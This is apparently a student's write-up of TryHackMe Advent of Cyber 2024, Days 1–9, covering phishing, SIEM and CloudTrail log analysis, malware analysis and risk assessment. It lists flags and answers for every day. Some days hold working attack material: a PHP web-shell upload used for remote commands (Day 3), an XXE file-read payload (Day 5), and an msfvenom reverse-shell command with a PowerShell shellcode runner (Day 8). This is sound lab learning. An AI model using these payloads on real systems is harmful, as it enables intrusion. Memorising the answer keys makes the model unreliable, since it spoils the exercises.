# Day 1

**Challenge:**
- The challenge starts with a YT to MP3 converter which downloads two files song.mp3 and somg.mp3. By using `file song.mp3` & `file somg.mp3` it can be found that somg.mp3 is actually a Windows shortcut (.lnk) which can contain malicious code.
- By using `exiftool somg.mp3` it's found that there's a link to raw GitHub code in the command line arguments \[https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1 ]. This code sends stolen info into a C2 server. A part of this code can be searched on GitHub to trace back the user that posted this code by searching through the issues raised. \[https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1 ]

**Questions:**
1. *Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author?*
Answer: Tyler Ramsbey. This can be done with `exiftool song.mp3`

2. *The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?*
Answer: http://papash3ll.thm/data. It can be found in the raw code next to `$c2Url`

3. *Who is M.M? Maybe his Github profile page would provide clues?*
Answer: Mayor Malware. From \[https://github.com/MM-WarevilleTHM/M.M ]

4. *What is the number of commits on the GitHub repo where the issue was raised?*
Answer: 1. \[https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search ]

**Concepts:**
- Phishing scams, malvertising and malware that can be obtained from downloading files from such websites
- OPSEC (operational security) which are tactics to protect security & identity of an operator or operation.
- Use of `exiftool` to view more info on a file.
# Day 2 

**Challenge:**
- This challenge provides an SIEM, Elastic, to observe events and the logs in a certain time-period.
- After setting the Absolute time period (Dec 1, 2024 @ 09:00:00.000 to Dec 1, 2024 @ 09:30:00.000) and adding fields & filters such as `user.name`, `event.outcome`, `source.ip`, the results can be analysed to check for any attacks.
- The `event.category` process & `process.command_line` show that a PowerShell command is being executed


**Questions:**
1. *What is the name of the account causing all the failed login attempts?*
Answer: service-admin. By setting `event.outcome: failure`  

2. *How many failed logon attempts were observed?*
Answer: 6791. Observed by setting `event.outcome: failure`

3. *What is the IP address of Glitch?*
Answer: 10.0.255.1. The IP that caused the spike in results.

4. *When did Glitch successfully logon to ADM-01? Format: MMM D, YYYY HH:MM:SS.SSS*
Answer: Dec 1, 2024 08:54:39.000. By setting `host.hostname = ADM-01`, `event.category: authentication` & `event.outcome: success`

5. *What is the decoded command executed by Glitch to fix the systems of Wareville?*
Answer: Install-WindowsUpdate -AcceptAll -AutoReboot. In `process.command_line`, there was a PowerShell code in base64 which can be converted from base64 to UTF-16LE text to give the answer. `SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==`

**Concepts:**
- SIEM - Security Information & Event Management system that allows real-time monitoring.
- Learnt how Elastic is used to monitor the events and logs 
- Difference in FP & TP

# Day 3

**Challenge:**
- This challenge required to analyse the logs of `frostypines-resorts` & `wareville-rails` using KQL (*Kibana Query Language*) for the blue task and perform a RCE (*Remote Code Execution*) on the http://frostypines.thm website for the red task.
- In KQL, by setting the timeframe to between *11:30 and 12:00 of October 3, 2024*, and using queries and filters, the location where the web shell is uploaded can be found and also information such as the IP addresses that accessed it.
- By first running the command `echo "[IP ADDRESS] frostypines.thm" >> /etc/hosts` in the terminal & then going to the `/admin` directory of the resort website, and creating & uploading the `shell.php` file that can expose the vulnerability as the room's image, shell commands can be run through the url http://frostypines.thm/media/images/rooms/shell.php?command=[command].

**Questions:**
1. *BLUE: Where was the web shell uploaded to?*
Answer: /media/images/rooms/shell.php. It can be found by going to the logs of `frostypines-resorts`, using the query `message: shell.php` and filtering it with response code of 200.

2. *BLUE: What IP address accessed the web shell?*
Answer: 10.11.83.34. Using the previous step, the IP of the attacker can be found under the `clientip` column.

3. *RED: What is the contents of the flag.txt?*
Answer: THM{Gl1tch_Was_H3r3}. The flag file can first be read by going to http://frostypines.thm/media/images/rooms/shell.php?command=ls and then read with http://frostypines.thm/media/images/rooms/shell.php?command=cat+flag.txt.

**Concepts:**
- Log analysis with ELK (Elasticsearch, Logstash, Kibana) & KQL 
- Learnt about RCE through insecure file upload vulnerabilities, which occurs when a file type for upload isn't specified.

# Day 4

**Challenge:**
- This challenge began with emulating a spear phishing attack which has the ID T1566.001. To do this, the `Invoke-AtomicTest T1566.001 -TestNumbers 1` can be run on PowerShell. Previous files from the test can be cleaned up with the `-cleanup`argument and prerequisites can be checked with the `-CheckPrereq` argument. 
- *Sysmon* event log can be cleared by going to `Applications and Services => Microsoft => Windows => Sysmon => Operational => Clear Log` in Event Viewer.
- On running `Invoke-AtomicTest T1566.001 -TestNumbers 1` again, new events are visible in the Operational tab and its details can be viewed. These details also show the location of the current directory.

**Questions:**
1. *What was the flag found in the .txt file that is found in the same directory as the PhishingAttachment.xslm artefact?*

Answer: THM{GlitchTestingForSpearphishing}. It can be found in `C:\Users\Administrator\AppData\Local\Temp\` as `PhishingAttachment.txt`

2. *What ATT&CK technique ID would be our point of interest?*

Answer: T1059. This is the MITRE ATT&CK ID for scripting interpreter.

3. *What ATT&CK subtechnique ID focuses on the Windows Command Shell?*

Answer: T1059.003. This is the ID for command shell and can be found on Google.

4. *What is the name of the Atomic Test to be simulated?*

Answer: Simulate BlackByte Ransomware Print Bombing. With `Invoke-AtomicTest T1059.003 -ShowDetails`, this name can be seen along with `Suspicious Execution via Windows Command Shell`.

5. *What is the name of the file used in the test?*

Answer: Wareville_Ransomware.txt. This can also be seen from running the previous .

6. *What is the flag found from this Atomic Test?*

Answer: THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}. Running `Invoke-AtomicTest T1059.003` creates a PDF which consists this flag. This is encoded in base64 and decodes to say "Glitch is not the enemy".

**Concepts:**
- MITRE ATT&CK which is a popular framework for understanding the different techniques and tactics that threat actors perform.

# Day 5

**Challenge:**
- The website given in the challenge allows users to request Christmas wishes by clicking on an item and adding it to the wish list.
- While checking out, after filling in address, the item is shown to be saved as Wish #. This feature can be exploited.
- To intercept this request, a browser can be opened in Burp Suite, and the request made while adding to wish list can be sent to Intruder. 
- Now, the XML in `/wishlist.php` which is
```xml
<wishlist> 
  <user_id> 
    1 
  </user_id> 
  <item> 
    <product_id> 
      1 
    </product_id>
  </item> 
</wishlist
```
can be changed to have an XXE payload which is
```xml
<!--?xml version="1.0" ?--> 
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]> 
<wishlist> 
  <user_id>
    1
  </user_id> 
  <item> 
    <product_id>
      &payload;
    </product_id> 
  </item> 
</wishlist>
```
This leaks the contents of the `/etc/hosts` file. This way contents of wish_[].txt files can be leaked with `[<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_[].txt"> ]`

**Questions:**
1. *What is the flag discovered after navigating through the wishes?*

Answer: THM{Brut3f0rc1n6_mY_w4y}. It is seen in Wish #15 and can be done by setting a payload in wish_1.txt and doing intruder attacks for payload values from 1 to 20.

2. *What is the flag seen on the possible proof of sabotage?*

Answer: THM{m4y0r_m4lw4r3_b4ckd00rs}. It's mentioned that the `/CHANGELOG` file can be accessed, which is where the flag is found.

**Concepts:**
- XML External Entity Injection
- Approaches to limit such attacks such as including `ibxml_disable_entity_loader(true)` and removing `/etc/host` or `/etc/passwd` from requests

# Day 6

**Challenge:**
- The first part of this challenge required us to change the directory to `C:\Tools` and then run `.\JingleBells.ps1`. This acts as an EDR (endpoint detection and response) and monitors events, and so when `MerryChristmas.exe` is opened, YARA rule is broken and a window containing the flag pops up as a warning.
![day6.png](https://github.com/teayahz/cryptonite_taskphase_tia/blob/main/AOC24/img/day6.JPG?raw=true)

- In the second part of the challenge, Floss is used for malware analysis. By running the command `PS C:\Tools\FLOSS> floss.exe C:\Tools\Malware\MerryChristmas.exe |Out-file C:\tools\malstrings.txt`, a .txt file is created which consists of the flag required which can be found by doing Ctrl+F and searching for THM.

**Questions:**
1. *What is the flag displayed in the popup window after the EDR detects the malware?*
Answer: THM{GlitchWasHere}

2. *What is the flag found in the malstrings.txt document after running floss.exe, and opening the file in a text editor?*
Answer: THM{HiddenClue}.

**Concepts:**
- Understand activity of malware using sandbox
- YARA which is a set of rules to detect malware
- Malware may not do anything if they detect they are in a sandbox

# Day 7

**Challenge:**
- I had to monitor the logs by navigating to the directory using `cd wareville-logs`. This contained `cloudtrail_log.json` & `rds.log`.
- The command `jq -r '["Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"],(.Records[] | select(.userIdentity.userName == PLACEHOLDER) | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'` can be used to monitor most of the actions required for this challenge, and the `PLACEHOLDER` can be replaced with the username whose activity is to be monitored, and some fields like `userAgent` can be added for the requirement. 
- To find the bank account number being used, `grep INSERT rds.log` can be run. `rds.log` is the Relational Database Service which is based on CloudWatch.

**Questions:**
1. *What is the other activity made by the user glitch aside from the ListObject action?*
**Answer:** PutObject. from the command `jq -r '["Event_Time", "Event_type", "Event_Name", "User_Name", "Source_IP", "User_Agent"],(.Records[] | select(.userIdentity.userName == "glitch") | [.eventTime,.eventType, .eventName, .userIdentity.userName //"N/A",.sourceIPAddress //"N/A", .userAgent //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'` under Event Name

2. *What is the source IP related to the S3 bucket activities of the user glitch?*
**Answer:** 53.94.201.69. which is found under Source_IP

3. *Based on the eventSource field, what AWS service generates the ConsoleLogin event?*
**Answer:** signin.amazonaws.com.

4. *When did the anomalous user trigger the ConsoleLogin event?*
**Answer:** 2024-11-28T15:21:54Z. The anomalous user is glitch and viewed under the command `jq -r '["Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"], (.Records[] | select(.sourceIPAddress=="53.94.201.69") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'`

5. *What was the name of the user that was created by the mcskidy user?*
**Answer:** glitch

6. *What type of access was assigned to the anomalous user?*
**Answer:** AdministratorAccess.
![day7.JPG](https://github.com/teayahz/cryptonite_taskphase_tia/blob/main/AOC24/img/day7.JPG?raw=true)

7. *Which IP does Mayor Malware typically use to log into AWS?*
**Answer:** 53.94.201.69.

8. *What is McSkidy's actual IP address?*
**Answer:** 31.210.15.79. from `jq -r '["Event_Time","Event_Source","Event_Name", "User_Name","User_Agent","Source_IP"],(.Records[] | select(.userIdentity.userName=="mcskidy") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A",.userAgent // "N/A",.sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'`

9. *What is the bank account number owned by Mayor Malware?*
**Answer:** 394 6912 7723 1294. by running `grep INSERT rds.log`

**Concepts:**
- AWS (Amazon Web Services) and platforms under it such as CloudWatch & CloudTrail which uses JSON formatting, and this JSON data can be filtered with JQ.

# Day 8

**Challenge:**
- Running `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKBOX_IP] LPORT=[PORT] -f powershell` on terminal gives the shell code needed for reverse shell as a hex-encoded byte array. 
- The command `nc -nvlp [PORT]` is used to listen into the port and receive data after the shellcode is executed.
- On replacing the `SHELLCODE` in this code with the hex from the first command, and executing them line by line on the PowerShell, the connection is made.
```powershell
$VrtAlloc = @" 
using System; 
using System.Runtime.InteropServices; 
public class VrtAlloc{ 
[DllImport("kernel32")] 
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); 
} 
"@ 
Add-Type $VrtAlloc 
$WaitFor= @" 
using System; 
using System.Runtime.InteropServices; 
public class WaitFor{ 
[DllImport("kernel32.dll", SetLastError=true)] 
public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
} 
"@ 
Add-Type $WaitFor 
$CrtThread= @" 
using System; 
using System.Runtime.InteropServices; 
public class CrtThread{ 
[DllImport("kernel32", CharSet=CharSet.Ansi)] 
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); 
} 
"@
Add-Type $CrtThread 
[Byte[]] $buf = SHELLCODE
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length) 
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0) 
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```
![day8.JPG](https://github.com/teayahz/cryptonite_taskphase_tia/blob/main/AOC24/img/day8.JPG?raw=true)
- Now the command `dir` can view the directories on the Windows system and other commands can be executed this way.

**Questions:**
1. *What is the flag value once Glitch gets reverse shell on the digital vault using port 4444? Note: The flag may take around a minute to appear in the **C:\Users\glitch\Desktop** directory. You can view the content of the flag by using the command **type C:\Users\glitch\Desktop\flag.txt**.*
**Answer:** AOC{GOT_MY_ACCESS_B@CK007}. By executing `type C:\Users\glitch\Desktop\flag.txt` after the connection through port 4444 is made, `flag.txt` can be read.

**Concepts:**
- Generating shellcodes and reverse shell using msfvenom
- Executing shellcode on PowerShell

# Day 9

**Challenge:**
- The site provided with the challenge had answers from three vendors to be assessed for their risks. After allotting a score for each of the three questions to each of the three vendors, the overall lowest risk score is found. One such question was:
![day9.JPG](https://github.com/teayahz/cryptonite_taskphase_tia/blob/main/AOC24/img/day9.JPG?raw=true)

**Questions:**
1. *What does GRC stand for?*
**Answer:** Governance, Risk, and Compliance

2. *What is the flag you receive after performing the risk assessment?*
**Answer:** THM{R15K_M4N4G3D}. This was obtained at the end of the assessment after picking the vendor with the lowest risk score.

**Concepts:**
- Risk Management - how they're done, why and where.
